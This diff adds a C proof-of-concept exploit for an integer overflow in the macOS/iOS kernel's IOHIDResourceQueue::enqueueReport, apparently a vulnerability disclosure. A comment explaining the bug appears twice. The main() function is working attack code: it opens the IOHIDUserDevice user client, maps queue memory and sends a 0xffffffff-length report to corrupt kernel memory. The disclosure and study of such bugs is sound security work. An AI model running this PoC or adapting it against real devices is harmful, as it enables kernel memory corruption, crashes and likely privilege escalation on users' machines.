@@ -1,0 +1,230 @@
+/*
+IOHIDResourceQueue inherits from IOSharedDataQueue and adds its own ::enqueueReport method,
+which seems to be mostly copy-pasted from IOSharedDataQueue and IODataQueue's ::enqueue methods.
+
+I reported a bunch of integer overflows in IODataQueue over four years ago (CVE-2014-4389, apple issue 607452866)
+
+IOHIDResourceQueue::enqueueReport has basically the same bug:
+
+Boolean IOHIDResourceQueue::enqueueReport(IOHIDResourceDataQueueHeader * header, IOMemoryDescriptor * report)
+{
+    UInt32              headerSize  = sizeof(IOHIDResourceDataQueueHeader);
+    UInt32              reportSize  = report ? (UInt32)report->getLength() : 0;
+    UInt32              dataSize    = ALIGNED_DATA_SIZE(headerSize + reportSize, sizeof(uint32_t));   <--- (a)
+    UInt32              head;
+    UInt32              tail;
+    UInt32              newTail;
+    const UInt32        entrySize   = dataSize + DATA_QUEUE_ENTRY_HEADER_SIZE;
+    IODataQueueEntry *  entry;
+
+    // Force a single read of head and tail
+    head = __c11_atomic_load((_Atomic UInt32 *)&dataQueue->head, __ATOMIC_RELAXED);
+    tail = __c11_atomic_load((_Atomic UInt32 *)&dataQueue->tail, __ATOMIC_RELAXED);
+
+    if ( tail > getQueueSize() || head > getQueueSize() || dataSize < headerSize || entrySize < dataSize)   <--- (b)
+    {
+        return false;
+    }
+
+    if ( tail >= head )
+    {
+        // Is there enough room at the end for the entry?
+        if ((getQueueSize() - tail) >= entrySize )
+        {
+            entry = (IODataQueueEntry *)((UInt8 *)dataQueue->queue + tail);
+
+            entry->size = dataSize;
+
+            bcopy(header, &entry->data, headerSize);
+
+            if ( report )
+                report->readBytes(0, ((UInt8*)&entry->data) + headerSize, reportSize);     <--- (c)
+
+
+
+
+Report is the IOMemoryDescriptor which wraps the stucture input to the io_connect_call, it's wrapping a portion 
+of userspace so we can actually make an IOMemoryDescriptor with a length of 0xffffffff. This will overflow at (a)
+giving us a small value for dataSize. This will pass the checks at (b) but then the reportSize value is used at (c)
+for the actually memory write operation.
+
+The IOHIDResource is used when userspace wants to implement an HID device; to exploit this you need there to actually be one
+of these devices. If you have the com.apple.hid.manager.user-access-device entitlement you can create one of these.
+
+A bunch of daemons do possess this entitlement, for example bluetoothd needs it to implement bluetooth HID keyboards,
+so if you have a bluetooth keyboard connected you can trigger this bug without needing com.apple.hid.manager.user-access-device.)
+
+You can test this PoC either by connecting a bluetooth HID device, or by building the IOHIDResource keyboard example
+from the IOHIDFamily code, giving it the correct entitlement and running it.
+*/
+
+// @i41nbeer
+
+/*
+iOS/MacOS kernel memory corruption due to integer overflow in IOHIDResourceQueue::enqueueReport
+
+IOHIDResourceQueue inherits from IOSharedDataQueue and adds its own ::enqueueReport method,
+which seems to be mostly copy-pasted from IOSharedDataQueue and IODataQueue's ::enqueue methods.
+
+I reported a bunch of integer overflows in IODataQueue over four years ago (CVE-2014-4389, apple issue 607452866)
+
+IOHIDResourceQueue::enqueueReport has basically the same bug:
+
+Boolean IOHIDResourceQueue::enqueueReport(IOHIDResourceDataQueueHeader * header, IOMemoryDescriptor * report)
+{
+    UInt32              headerSize  = sizeof(IOHIDResourceDataQueueHeader);
+    UInt32              reportSize  = report ? (UInt32)report->getLength() : 0;
+    UInt32              dataSize    = ALIGNED_DATA_SIZE(headerSize + reportSize, sizeof(uint32_t));   <--- (a)
+    UInt32              head;
+    UInt32              tail;
+    UInt32              newTail;
+    const UInt32        entrySize   = dataSize + DATA_QUEUE_ENTRY_HEADER_SIZE;
+    IODataQueueEntry *  entry;
+
+    // Force a single read of head and tail
+    head = __c11_atomic_load((_Atomic UInt32 *)&dataQueue->head, __ATOMIC_RELAXED);
+    tail = __c11_atomic_load((_Atomic UInt32 *)&dataQueue->tail, __ATOMIC_RELAXED);
+
+    if ( tail > getQueueSize() || head > getQueueSize() || dataSize < headerSize || entrySize < dataSize)   <--- (b)
+    {
+        return false;
+    }
+
+    if ( tail >= head )
+    {
+        // Is there enough room at the end for the entry?
+        if ((getQueueSize() - tail) >= entrySize )
+        {
+            entry = (IODataQueueEntry *)((UInt8 *)dataQueue->queue + tail);
+
+            entry->size = dataSize;
+
+            bcopy(header, &entry->data, headerSize);
+
+            if ( report )
+                report->readBytes(0, ((UInt8*)&entry->data) + headerSize, reportSize);     <--- (c)
+
+
+
+
+Report is the IOMemoryDescriptor which wraps the stucture input to the io_connect_call, it's wrapping a portion 
+of userspace so we can actually make an IOMemoryDescriptor with a length of 0xffffffff. This will overflow at (a)
+giving us a small value for dataSize. This will pass the checks at (b) but then the reportSize value is used at (c)
+for the actually memory write operation.
+
+The IOHIDResource is used when userspace wants to implement an HID device; to exploit this you need there to actually be one
+of these devices. If you have the com.apple.hid.manager.user-access-device entitlement you can create one of these.
+
+A bunch of daemons do possess this entitlement, for example bluetoothd needs it to implement bluetooth HID keyboards,
+so if you have a bluetooth keyboard connected you can trigger this bug without needing com.apple.hid.manager.user-access-device.)
+
+You can test this PoC either by connecting a bluetooth HID device, or by building the IOHIDResource keyboard example
+from the IOHIDFamily code, giving it the correct entitlement and running it.
+
+Tested on MacOS 10.13.6 (17G65)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+
+int main(int argc, char** argv){
+  printf("pid: %d\n", getpid());
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDUserDevice"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  printf("got client\n");
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+  
+  // open
+  
+  inputScalar[0] = 0;
+  inputScalarCnt = 1;
+
+  err = IOConnectCallMethod(
+    conn,
+    1,
+    inputScalar,
+    inputScalarCnt,
+    inputStruct,
+    inputStructCnt,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+    printf("IOConnectCall error: %x\n", err);
+    return 0;
+  }
+
+  printf("called external method open\n");
+  
+  mach_vm_address_t addr = 0x4100000000;
+  mach_vm_size_t size = 0x1000;
+
+  err = IOConnectMapMemory(conn, 0, mach_task_self(), &addr, &size, 0);
+  if (err != KERN_SUCCESS){
+    printf("IOConnectMapMemory failed:0x%x\n", err);
+    return 0;
+  }
+  
+  printf("mapped queue memory here: %016llx\n", addr);	
+
+  char* buf = malloc(0x100000000);
+  memset(buf, 'A', 0x100000000);
+
+  inputScalar[0] = 0x0;
+  inputScalar[1] = 0x0;
+  inputScalarCnt = 3;
+  outputScalarCnt = 0;
+
+  err = IOConnectCallMethod(
+    conn,
+    13, // setreport
+    inputScalar,
+    inputScalarCnt,
+    buf,
+    0xffffffff,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+    printf("IOConnectCall error: %x\n", err);
+    return 0;
+  }
+  
+  return 0;
+}
